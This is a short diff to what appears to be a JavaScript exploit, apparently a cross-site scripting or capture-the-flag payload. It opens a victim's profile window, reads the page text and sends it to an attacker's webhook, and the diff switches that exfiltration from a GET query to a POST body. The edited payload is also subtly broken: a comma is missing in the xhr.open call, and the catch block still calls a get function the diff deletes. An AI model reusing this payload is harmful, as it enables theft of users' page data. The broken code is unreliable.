@@ -30,15 +30,11 @@ try {
   window.open(PROFILE, OPEN);
 
   const payload = `
-function get(url) {
-  let xhr = new XMLHttpRequest();
-  xhr.open("GET", url, false);
-  return xhr.send(null);
-}
-
 try {
   const profile = window.open("", "${OPEN}");
-  get("${WEBHOOK}?" + profile.document.body.innerText);
+  let xhr = new XMLHttpRequest();
+  xhr.open("POST", "${WEBHOOK}" false);
+  xhr.send(profile.document.body.innerText);
 } catch (error) {
   get("${WEBHOOK}?" + error);
 }
